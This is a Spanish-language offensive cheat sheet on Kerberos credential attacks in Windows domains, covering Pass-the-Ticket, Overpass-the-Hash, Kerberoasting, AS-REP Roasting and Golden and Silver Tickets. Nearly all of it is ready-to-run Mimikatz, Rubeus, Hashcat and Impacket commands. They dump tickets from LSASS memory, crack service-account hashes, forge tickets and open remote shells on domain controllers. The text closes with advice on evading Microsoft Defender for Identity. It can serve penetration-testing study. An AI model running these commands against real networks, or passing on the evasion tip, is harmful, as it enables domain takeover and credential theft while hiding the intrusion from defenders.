# Pass-the-Ticket (PtT) desde Windows

Pass-the-Ticket explota la autenticación Kerberos inyectando tickets TGT o TGS directamente en la sesión activa, sin conocer la contraseña ni el hash NT. Los tickets son credenciales Kerberos temporales que el sistema almacena en memoria; si se extraen, pueden importarse en otra sesión para autenticarse como el usuario propietario del ticket.

### Conceptos previos

**TGT (Ticket Granting Ticket)** — ticket maestro emitido por el KDC tras autenticación inicial. Cifrado con el hash de `krbtgt`. Con un TGT se pueden solicitar TGS para cualquier servicio del dominio.

**TGS (Ticket Granting Service)** — ticket de servicio específico, emitido por el KDC a petición del TGT. Cifrado con el hash de la cuenta de servicio.

Los tickets se almacenan en memoria en el proceso LSASS y tienen vida limitada (por defecto 10 horas para TGT, renovables hasta 7 días).

### Extracción de tickets con Mimikatz

```
# Listar tickets en memoria
sekurlsa::tickets

# Exportar todos los tickets a archivos .kirbi
sekurlsa::tickets /export

# Exportar con Rubeus
Rubeus.exe dump /nowrap
Rubeus.exe dump /user:jsmith /nowrap
```

Los tickets se guardan como archivos `.kirbi` en el directorio actual.

### Importar un ticket — inyección en sesión

```
# Con Mimikatz — purgar tickets actuales e importar uno nuevo
kerberos::purge
kerberos::ptt ticket.kirbi

# Verificar que el ticket está cargado
kerberos::list

# Con Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi
Rubeus.exe ptt /ticket:base64_del_ticket
```

Tras la inyección, los comandos de red en esa sesión usarán el ticket importado:

```cmd
dir \\dc01.dominio.local\C$
psexec.exe \\servidor.dominio.local cmd.exe
```

### Rubeus — Kerberoasting y AS-REP Roasting

Rubeus también permite solicitar tickets para cuentas vulnerables directamente:

```cmd
# Kerberoasting — solicitar TGS de cuentas con SPN
Rubeus.exe kerberoast /nowrap
Rubeus.exe kerberoast /user:svcSQL /nowrap

# AS-REP Roasting — cuentas sin preautenticación
Rubeus.exe asreproast /nowrap
Rubeus.exe asreproast /user:svcBackup /nowrap
```

Los hashes resultantes se crackean con Hashcat:

```bash
hashcat -m 13100 tgs_hashes.txt rockyou.txt    # Kerberoasting
hashcat -m 18200 asrep_hashes.txt rockyou.txt  # AS-REP Roasting
```

### Overpass-the-Hash — de hash NT a ticket Kerberos

Si se tiene el hash NT de un usuario pero el servicio objetivo solo acepta Kerberos, se puede solicitar un TGT usando el hash y luego operar con Kerberos:

```
# Mimikatz — solicita TGT usando el hash NT y lo inyecta
sekurlsa::pth /user:jsmith /domain:EMPRESA /ntlm:64f12cddaa88057e06a81b54e73b949b /run:cmd.exe
# En la nueva ventana:
klist    # verificar TGT
dir \\dc01\C$
```

```cmd
# Rubeus — versión más limpia
Rubeus.exe asktgt /user:jsmith /rc4:64f12cddaa88057e06a81b54e73b949b /ptt
```

### Golden Ticket

Con el hash NT de la cuenta `krbtgt` (obtenido via DCSync), se puede forjar un TGT completamente válido para cualquier usuario, con cualquier membresía de grupo y duración arbitraria:

```
# Mimikatz
kerberos::golden /user:Administrador /domain:dominio.local /sid:S-1-5-21-... /krbtgt:hash_krbtgt /ptt

# Impacket (genera archivo .ccache)
impacket-ticketer -nthash hash_krbtgt -domain-sid S-1-5-21-... -domain dominio.local Administrador
export KRB5CCNAME=Administrador.ccache
impacket-psexec -k -no-pass dominio.local/Administrador@dc01.dominio.local
```

### Silver Ticket

Con el hash NT de una **cuenta de servicio** (no de `krbtgt`), se puede forjar un TGS para ese servicio específico. No requiere comunicación con el KDC, lo que lo hace indetectable para el DC:

```
kerberos::golden /user:Administrador /domain:dominio.local /sid:S-1-5-21-... \
  /target:servidor.dominio.local /service:cifs /rc4:hash_cuenta_servicio /ptt
```

| Ticket            | Hash necesario     | Acceso                                            |
| ----------------- | ------------------ | ------------------------------------------------- |
| **Golden Ticket** | `krbtgt`           | Cualquier servicio del dominio, cualquier usuario |
| **Silver Ticket** | Cuenta de servicio | Solo el servicio específico                       |

> Los Golden Tickets generados con Mimikatz usan por defecto una duración de 10 años. Microsoft Defender for Identity detecta TGTs con duración anómala. Usar duraciones realistas (10 horas) reduce la visibilidad.
